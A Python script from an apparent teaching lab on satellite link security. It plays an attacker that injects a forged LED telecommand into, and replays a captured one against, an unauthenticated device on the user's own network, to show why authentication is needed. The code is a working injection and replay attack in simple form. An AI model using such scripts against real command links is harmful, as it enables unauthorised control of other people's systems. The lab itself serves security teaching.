"""
Attacker - phase 0. Demo of the "before": with no authentication, anyone can command.

This script is NOT the ground station and does not know any secret, but the
satellite obeys it anyway, because in phase 0 there is no way to tell a real
telecommand from a fake one.

Scenarios:
  inject  -> injects a fake telecommand (red screen = payload taken over)
  replay  -> sends a "captured" ground telecommand again, several times

Usage (in PowerShell):
    py attacks/attack_f0.py --sat 192.168.1.50 inject
    py attacks/attack_f0.py --sat 192.168.1.50 replay --times 3

Only against your own C5, on your own network.
"""

import argparse
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))
from ground_f0 import TC_PORT, send_tc  # noqa: E402

# What an attacker would "capture" listening to the link:
CAPTURED_TC = "LED 0 200 0"  # ground setting the payload to green
FAKE_TC = "LED 255 0 0"      # bright red: the payload is in the attacker's hands


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Attacker (phase 0, only for your lab)")
    p.add_argument("--sat", required=True, help="IP of YOUR C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="scenario", required=True)
    sub.add_parser("inject", help="inject a fake telecommand")
    rp = sub.add_parser("replay", help="send a captured telecommand again")
    rp.add_argument("--times", type=int, default=3)
    args = p.parse_args(argv)

    if args.scenario == "inject":
        print(f"[ATTACKER] Injecting fake TC: \"{FAKE_TC}\"")
        r = send_tc(args.sat, FAKE_TC, port=args.port)
        print(f"[ATTACKER] Answer: {r}")
        if r and r.startswith("ACK"):
            print("[ATTACKER] The satellite accepted a command from someone who is not the ground station.")
    else:
        accepted = 0
        for i in range(1, args.times + 1):
            r = send_tc(args.sat, CAPTURED_TC, port=args.port)
            print(f"[ATTACKER] Replay {i}/{args.times}: \"{CAPTURED_TC}\" -> {r}")
            if r and r.startswith("ACK"):
                accepted += 1
            time.sleep(0.5)
        print(f"[ATTACKER] {accepted} of {args.times} replays accepted: "
              "the satellite does not see that the commands are repeated.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
